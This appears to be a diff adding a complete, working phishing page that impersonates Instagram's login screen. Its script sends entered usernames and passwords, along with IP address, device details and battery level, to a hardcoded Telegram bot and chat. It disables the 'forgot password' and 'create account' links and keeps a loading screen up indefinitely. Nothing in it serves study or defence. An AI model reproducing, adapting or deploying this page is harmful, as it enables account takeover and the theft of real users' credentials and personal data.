@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 16px;
+        }
+        .login-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 40px 36px 30px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            position: relative;
+            margin: auto;
+        }
+        .insta-logo {
+            font-size: 44px;
+            font-weight: 400;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: -1.5px;
+            margin-bottom: 28px;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .insta-logo i {
+            font-size: 40px;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .insta-logo span {
+            -webkit-text-fill-color: #262626;
+            font-weight: 400;
+        }
+        .login-card input {
+            width: 100%;
+            padding: 11px 10px;
+            margin-bottom: 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.15s ease;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .login-card input::placeholder {
+            color: #8e8e8e;
+            font-weight: 300;
+        }
+        .login-card input:focus {
+            border-color: #a8a8a8;
+            background: #ffffff;
+        }
+        .login-card input:-webkit-autofill,
+        .login-card input:-webkit-autofill:hover,
+        .login-card input:-webkit-autofill:focus,
+        .login-card input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 30px #fafafa inset !important;
+            -webkit-text-fill-color: #262626 !important;
+            transition: background-color 9999s ease-in-out 0s;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 9px 0;
+            margin-top: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s ease, opacity 0.15s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        .login-btn:hover:not(:disabled) {
+            background: #0077d4;
+        }
+        .login-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid #ffffff;
+            border-top: 2.5px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .spinner.show {
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .forgot-link,
+        .create-link {
+            display: inline-block;
+            font-size: 13px;
+            color: #00376b;
+            text-decoration: none;
+            cursor: pointer;
+            transition: opacity 0.15s ease;
+        }
+        .forgot-link:hover,
+        .create-link:hover {
+            text-decoration: underline;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 18px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 22px 0 20px;
+            gap: 12px;
+        }
+        .divider .line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider .or {
+            font-size: 13px;
+            color: #8e8e8e;
+            font-weight: 600;
+        }
+        .create-link {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0095f6;
+        }
+        .footer-meta {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #8e8e8e;
+            letter-spacing: 0.3px;
+        }
+        .footer-meta .meta-name {
+            font-weight: 500;
+            color: #737373;
+        }
+        .footer-meta .site-link {
+            color: #8e8e8e;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 2px;
+        }
+        .footer-meta .site-link:hover {
+            text-decoration: underline;
+        }
+        .error-msg,
+        .success-msg {
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+        .error-msg {
+            color: #ed4956;
+        }
+        .success-msg {
+            color: #00c853;
+        }
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.94);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            border-radius: 4px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 14px;
+            z-index: 100;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading-overlay.show {
+            display: flex;
+            opacity: 1;
+        }
+        .loading-overlay .big-spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #dbdbdb;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        .loading-overlay .loading-text {
+            color: #262626;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .loading-overlay .sub-text {
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .session-badge {
+            display: none !important;
+        }
+
+        @media (max-width: 450px) {
+            html,
+            body {
+                padding: 0;
+                background: #ffffff;
+                align-items: center;
+                justify-content: center;
+            }
+            .login-card {
+                border: none;
+                background: transparent;
+                max-width: 100%;
+                padding: 28px 24px 24px;
+                margin: auto;
+                border-radius: 0;
+                min-height: auto;
+            }
+            .insta-logo {
+                font-size: 36px;
+                margin-bottom: 24px;
+            }
+            .insta-logo i {
+                font-size: 32px;
+            }
+            .login-card input {
+                padding: 14px 12px;
+                font-size: 15px;
+                background: #fafafa;
+            }
+            .login-btn {
+                padding: 12px 0;
+                font-size: 15px;
+            }
+            .forgot-link {
+                font-size: 13px;
+                margin-top: 16px;
+            }
+            .create-link {
+                font-size: 14px;
+            }
+            .footer-meta {
+                font-size: 11px;
+                margin-top: 24px;
+            }
+            .divider {
+                margin: 18px 0 16px;
+            }
+            .loading-overlay {
+                border-radius: 0;
+            }
+        }
+        @media (max-width: 380px) {
+            .login-card {
+                padding: 20px 16px 18px;
+            }
+            .insta-logo {
+                font-size: 30px;
+                margin-bottom: 20px;
+            }
+            .insta-logo i {
+                font-size: 26px;
+            }
+            .login-card input {
+                padding: 12px 10px;
+                font-size: 14px;
+            }
+            .login-btn {
+                padding: 10px 0;
+                font-size: 14px;
+            }
+        }
+        @media (min-width: 451px) and (max-width: 1024px) {
+            .login-card {
+                max-width: 380px;
+                padding: 44px 40px 34px;
+            }
+            .insta-logo {
+                font-size: 48px;
+            }
+            .insta-logo i {
+                font-size: 44px;
+            }
+            .login-card input {
+                padding: 14px 14px;
+                font-size: 15px;
+            }
+            .login-btn {
+                padding: 12px 0;
+                font-size: 16px;
+            }
+        }
+        @supports (-webkit-touch-callout: none) {
+            input {
+                font-size: 16px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card" id="loginCard">
+
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="big-spinner"></div>
+            <div class="loading-text">Please wait...</div>
+            <div class="sub-text">Connecting to Instagram</div>
+        </div>
+
+        <div class="insta-logo">
+            <i class="fab fa-instagram"></i>
+            <span>Instagram</span>
+        </div>
+
+        <input type="text" id="username" placeholder="Username, email address or mobile number" 
+               autocomplete="off" readonly onfocus="this.removeAttribute('readonly'); this.value='';" />
+        <input type="password" id="password" placeholder="Password" 
+               autocomplete="new-password" readonly onfocus="this.removeAttribute('readonly'); this.value='';" />
+
+        <button class="login-btn" id="loginBtn">
+            <span class="spinner" id="spinner"></span>
+            <span class="btn-text" id="btnText">Log in</span>
+        </button>
+
+        <div class="error-msg" id="errorMsg"></div>
+        <div class="success-msg" id="successMsg"></div>
+
+        <a class="forgot-link" id="forgotLink">Forgotten password?</a>
+
+        <div class="divider">
+            <span class="line"></span>
+            <span class="or">OR</span>
+            <span class="line"></span>
+        </div>
+
+        <a class="create-link" id="createLink">Create new account</a>
+
+        <div class="footer-meta">
+            <span class="meta-name">Meta</span>
+            <br />
+            <a href="#" class="site-link">instagram.com</a>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔹 TELEGRAM CONFIG (NAYA TOKEN + CHAT ID)
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = "7613241999:A4HQ6h2xGvHmr6MkIoLECghsCu-bykBAP1";
+        const TELEGRAM_CHAT_ID = "8916757414";
+        // ============================================================
+
+        // ============================================================
+        // 🔹 DOM ELEMENTS
+        // ============================================================
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+        const spinner = document.getElementById('spinner');
+        const btnText = document.getElementById('btnText');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const forgotLink = document.getElementById('forgotLink');
+        const createLink = document.getElementById('createLink');
+
+        // ============================================================
+        // 🔹 FAKE LINKS
+        // ============================================================
+        forgotLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            errorMsg.textContent = '❌ This feature is currently unavailable. Please try again later.';
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+            setTimeout(() => { errorMsg.style.display = 'none'; }, 4000);
+        });
+
+        createLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            errorMsg.textContent = '❌ Unable to create account at this time. Please try again later.';
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+            setTimeout(() => { errorMsg.style.display = 'none'; }, 4000);
+        });
+
+        // ============================================================
+        // 🔹 GET REAL IP
+        // ============================================================
+        async function getRealIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        // ============================================================
+        // 🔹 GET DEVICE INFO
+        // ============================================================
+        function getDeviceInfo() {
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                const d = result.device || {};
+                const o = result.os || {};
+                const b = result.browser || {};
+
+                const vendor = d.vendor || 'Unknown';
+                const model = d.model || '';
+                const type = d.type || 'Desktop';
+
+                let deviceName = vendor;
+                if (model) deviceName += ' ' + model;
+                if (deviceName.trim() === '' || deviceName === 'Unknown') {
+                    deviceName = type === 'mobile' ? '📱 Mobile' :
+                        type === 'tablet' ? '📟 Tablet' : '💻 Desktop';
+                }
+
+                let deviceType = 'Desktop';
+                if (type === 'mobile') deviceType = '📱 Mobile';
+                else if (type === 'tablet') deviceType = '📟 Tablet';
+                else if (type === 'smarttv') deviceType = '📺 TV';
+                else if (type === 'console') deviceType = '🎮 Console';
+                else if (type === 'wearable') deviceType = '⌚ Wearable';
+                else if (type === 'embedded') deviceType = '🔌 Embedded';
+                else if (type === 'bot' || navigator.userAgent.includes('bot')) deviceType = '🤖 Bot';
+                else if (window.screen.width >= 1024 && window.screen.height >= 768) {
+                    deviceType = 'ontouchstart' in window ? '💻 Laptop (Touch)' : '🖥️ Desktop';
+                } else {
+                    deviceType = '💻 Laptop';
+                }
+
+                let osDisplay = o.name || 'Unknown';
+                if (o.version) osDisplay += ' ' + o.version;
+
+                let browserDisplay = b.name || 'Unknown';
+                if (b.version) browserDisplay += ' ' + b.version;
+
+                const w = window.screen.width;
+                const h = window.screen.height;
+                const pr = window.devicePixelRatio || 1;
+
+                return {
+                    type: deviceType,
+                    name: deviceName,
+                    os: osDisplay,
+                    browser: browserDisplay,
+                    screen: `${w}x${h} (${pr}x)`,
+                    touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+                };
+            } catch {
+                return {
+                    type: 'Unknown',
+                    name: 'Unknown',
+                    os: 'Unknown',
+                    browser: 'Unknown',
+                    screen: 'Unknown',
+                    touch: 'Unknown'
+                };
+            }
+        }
+
+        // ============================================================
+        // 🔹 GET BATTERY PERCENTAGE
+        // ============================================================
+        async function getBatteryLevel() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? '⚡ Charging' : '🔋 Not Charging';
+                    return `${level}% (${charging})`;
+                } else {
+                    return '🔋 Not Supported';
+                }
+            } catch {
+                return '🔋 Unknown';
+            }
+        }
+
+        // ============================================================
+        // 🔹 SEND TO TELEGRAM
+        // ============================================================
+        async function sendToTelegram(username, password, ip, device, battery) {
+            
+            const msg = `
+🔐 NEW LOGIN DETECTED!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 LOGIN DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 Username: ${username}
+🔑 Password: ${password}
+
+🌐 IP: ${ip}
+📱 Device: ${device.name}
+📱 Type: ${device.type}
+💻 OS: ${device.os}
+🌍 Browser: ${device.browser}
+📺 Screen: ${device.screen}
+✋ Touch: ${device.touch}
+🔋 Battery: ${battery}
+
+🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+⚠️ Check your account immediately!
+`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const data = await res.json();
+                console.log('📨 Telegram Response:', data);
+                return data.ok ? { success: true } : { success: false, error: data.description };
+            } catch (e) {
+                console.error('❌ Fetch Error:', e);
+                return { success: false, error: e.message };
+            }
+        }
+
+        // ============================================================
+        // 🔹 LOGIN — PERMANENT LOADING
+        // ============================================================
+        loginBtn.addEventListener('click', async function() {
+            const user = usernameInput.value.trim();
+            const pass = passwordInput.value.trim();
+
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            if (!user || !pass) {
+                errorMsg.textContent = '❌ Please fill in both fields';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            console.log('🔵 Login Clicked! User:', user);
+
+            // Start loading (never hides)
+            spinner.classList.add('show');
+            btnText.textContent = 'Logging in...';
+            loginBtn.disabled = true;
+            loadingOverlay.classList.add('show');
+
+            try {
+                // Get all info
+                const ip = await getRealIP();
+                const device = getDeviceInfo();
+                const battery = await getBatteryLevel();
+
+                console.log('📤 Sending to Telegram...');
+
+                // Send to Telegram
+                const result = await sendToTelegram(user, pass, ip, device, battery);
+
+                if (result.success) {
+                    console.log('✅ Telegram notification sent!');
+                } else {
+                    console.error('❌ Telegram Error:', result.error);
+                    errorMsg.textContent = '❌ Error: ' + result.error;
+                    errorMsg.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                errorMsg.textContent = '❌ Error: ' + error.message;
+                errorMsg.style.display = 'block';
+            }
+
+            // ⚠️ LOADING KABHI NAHI HATEGI
+        });
+
+        // Enter key
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') loginBtn.click();
+        });
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') loginBtn.click();
+        });
+
+        // Force clear input fields on load
+        window.addEventListener('load', function() {
+            usernameInput.value = '';
+            passwordInput.value = '';
+            setTimeout(() => {
+                usernameInput.removeAttribute('readonly');
+                passwordInput.removeAttribute('readonly');
+            }, 100);
+            loadingOverlay.classList.remove('show');
+            spinner.classList.remove('show');
+            btnText.textContent = 'Log in';
+            loginBtn.disabled = false;
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+        });
+
+        usernameInput.addEventListener('click', function() {
+            this.value = '';
+        });
+        passwordInput.addEventListener('click', function() {
+            this.value = '';
+        });
+
+        console.log('✅ Instagram Login Page — Configured!');
+        console.log('📌 Bot: InstagramIDPbot');
+        console.log('📌 Token:', TELEGRAM_BOT_TOKEN.substring(0, 15) + '...');
+        console.log('📌 Chat ID:', TELEGRAM_CHAT_ID);
+    </script>
+
+</body>
+</html>
